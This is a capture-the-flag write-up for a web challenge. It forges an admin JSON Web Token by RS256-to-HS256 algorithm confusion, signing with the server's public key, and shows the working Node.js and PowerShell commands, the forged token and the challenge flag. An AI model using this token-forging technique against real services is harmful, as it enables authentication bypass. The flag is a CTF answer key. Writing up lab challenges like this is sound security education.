# Unlock Me

> Points: 927 [1000]

## Description 
>Our agents discovered COViD's admin panel! They also stole the credentials **minion:banana**, but it seems that the user isn't allowed in. Can you find another way?  
> [Admin Panel](http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/)  
>This challenge:
>- Unlocks other challenge(s)
>- Is eligible for Awesome Write-ups Award
>- Prerequisite for Mastery Award - Web Warrior

## Solution
This challenge was interesting as we were able to learn about new jwt type attacks given the public key. Overall it was a freshing and new web challenge for us!

The credentials username banana and banana were given to us. The link brings us to the COViD HQ login. Attempting random credentials gives us the `Incorrect credentials` error. However when attempting to login using the credentials provide, us a different error `Only admins are allowed into HQ!`.

Upon closer inspection into the source code of html this was found
```html
<script>
$( "#signinForm" ).submit(function( event ) {
  event.preventDefault();
  fetch("login", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({"username": $( "#inputUsername" ).first().val(), "password": $( "#inputPassword" ).first().val() })
  }).then(function(response) {
    return response.json();
  }).then(function(data) {
    if (data.error) {
      $('#alerts').html('<div class="alert alert-danger" role="alert">'+data.error+'</div>');
    } else {
      fetch("unlock", {
        headers: {
          "Authorization": "Bearer " + data.accessToken
        }
      }).then(function(response) {
        return response.json();
      }).then(function(data) {
        if (data.error) {
          $('#alerts').html('<div class="alert alert-danger" role="alert">'+data.error+'</div>');
        } else {
          $('#alerts').html('<div class="alert alert-success" role="alert">'+data.flag+'</div>');
        }
      }).catch(function(error) {
        $('#alerts').html('<div class="alert alert-danger" role="alert">Request failed.</div>');
      })
    }
  }).catch(function(error) {
    $('#alerts').html('<div class="alert alert-danger" role="alert">Request failed.</div>');
  })
});
// TODO: Add client-side verification using public.pem
</script>
```

Upon seeing this we thought why not trying to access [public.pem](http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/) file directly which gave us the actual public.pem.

In addition the `fetch("login")` and `fetch("unlock")` seem to api routes.

As such we decided to query to api directly using powershell's `Invoke-RestMethod` to query the `/login`

```powershell
irm -Method Post "http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/login" -ContentType "application/json" -Body (@{username="minion";password="banana";}| ConvertTo-Json)
```

This gave us the access token to minion's account will be verified later
```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjA3NDIxMDcwfQ.x6nDrEn2HrT0Ey807PaevMobHpXxlEBJmRh1DsHEPhuYAJqxRrsgYP6SEpegOZ0WP8TmmHPmXc3Vq0vvZfHy4fKE91_m0a0oC9kyg8TziamJGu7htDl2niivf3w_Kf2A6nvmVc--z8bvGD2ir3gtHr4oncC53K7M7nOSdNbdXEPOczSE-TzijpaunMcr9oltmkMNWqwVl7JZgdTqbgUob5kxk9sSshiZEfZ-U45Ykc1WfecTWC_vgLmMaM8xvgGmcg_DxzM9cIMOC3Cmq96a3X7pZC3JkTk0KSOI1UUrue-2fCm2FimdABy9QrcZc9f4FyiVECX5jlt5Dq5BUFQWWv5k1d3ddOyG0T9EBf-jhmCGl581ixkDFtE44RNP8us2kyaffKWytR11xUEx13-OQowHc9yfIYi6nfbw2_ZCwTJgLBMQmkX72vyhsvAHGTjR8q2UKpEafIxDIVxy8IImXCSyuoOrpwDVzjewmBaLFYdgA80gzEHxYGq5OwMeDusyEFC_piJzy7J6FVJt7XIdxws1beswddaYfkEawRCHwYMqAg_qF63ws9omgyOQmTRq0KSYlyMU-5iOMC9QnKolpgyxqIBUizqV6sCQlKC6b9MYlSfo282vSecAe-EhMG2oE-oq5T_FMPzOyr4w_jh8aeVrHJIWM_qXnJOLuV04m7s
```

At this point we were quite stuck until we manage to find this https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/ which mentions the `None` algorithm attack. To test this we installed nodejs and jsonwebtoken
and ran the following code
```javascript
const jwt = require('jsonwebtoken')
let cert = fs.readFileSync('./public.pem')
let token = "thejwttokenfromabove"
payload = jwt.verify(token,cert)
payload
{ username: 'minion', role: 'user', iat: 1607421070 }
```
At this point we altered the payload and tried the none algorithm.

```javascript
payload['username']='admin'
'admin'
payload['role']='admin'
'admin'
payload
{ username: 'admin', role: 'admin', iat: 1607421070 }
jwt.sign(payload,cert,{algorithm:"None"})
Uncaught Error: "algorithm" must be a valid string enum value
    at /root/test/node_modules/jsonwebtoken/sign.js:52:15
    at Array.forEach (<anonymous>)
    at validate (/root/test/node_modules/jsonwebtoken/sign.js:43:6)
    at validateOptions (/root/test/node_modules/jsonwebtoken/sign.js:58:10)
    at Object.module.exports [as sign] (/root/test/node_modules/jsonwebtoken/sign.js:141:5)
```
At this point, I rechecked the same article saw another `RS256` to `HS256` vulnerability. Trying it, I was able to successfully generate a HS256 jwt token!

```javascript
jwt.sign(payload,cert,{algorithm:"HS256"})
'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjA3NDIxMDcwfQ.UxWelBJcgZWuFjT8GB0zyw9tbsANLkbZr9dAGnC1wDI'
```
Using the token above I tried to call the `/unlock` which gave me the flag! Whoorays!

```powershell
irm "http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/unlock" -Headers @{Authorization="Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjA3NDIxMDcwfQ.UxWelBJcgZWuFjT8GB0zyw9tbsANLkbZr9dAGnC1wDI";}

flag
----
govtech-csg{5!gN_0F_+h3_T!m3S}
```

## Flag
`govtech-csg{5!gN_0F_+h3_T!m3S}`

